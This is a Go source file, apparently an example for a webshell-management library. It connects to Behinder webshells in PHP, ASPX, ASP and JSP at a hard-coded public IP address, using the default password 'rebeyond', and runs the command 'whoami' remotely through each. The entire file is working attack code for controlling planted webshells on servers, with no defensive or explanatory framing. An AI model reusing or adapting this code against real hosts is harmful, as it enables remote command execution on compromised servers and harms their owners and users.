package main

import (
	"fmt"
	"github.com/go0p/wsm"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/behinder"
	"log"
)

func main() {
	log.SetFlags(log.Lshortfile)
	jspExec()
	aspExec()
	aspxExec()
	phpExec()
}

func phpExec() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86/bx.php",
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	e := &behinder.ExecParams{
		OnlyJavaParams: behinder.OnlyJavaParams{},
		Cmd:            "whoami",
		Path:           "C:\\",
	}
	exec, err := bx.CommandExec(e)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(exec.ToMap())
}

func aspxExec() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.aspx",
			Password: "rebeyond",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	e := &behinder.ExecParams{
		OnlyJavaParams: behinder.OnlyJavaParams{},
		Cmd:            "whoami",
		Path:           "C:\\",
	}
	exec, err := bx.CommandExec(e)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(exec.ToMap())
}

func aspExec() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.asp",
			Password: "rebeyond",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	e := &behinder.ExecParams{
		OnlyJavaParams: behinder.OnlyJavaParams{},
		Cmd:            "whoami",
		Path:           "C:\\",
	}
	exec, err := bx.CommandExec(e)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(exec.ToMap())
}

func jspExec() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	e := &behinder.ExecParams{
		OnlyJavaParams: behinder.OnlyJavaParams{},
		Cmd:            "whoami",
		Path:           "C:\\",
	}
	exec, err := bx.CommandExec(e)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(exec.ToMap())
}
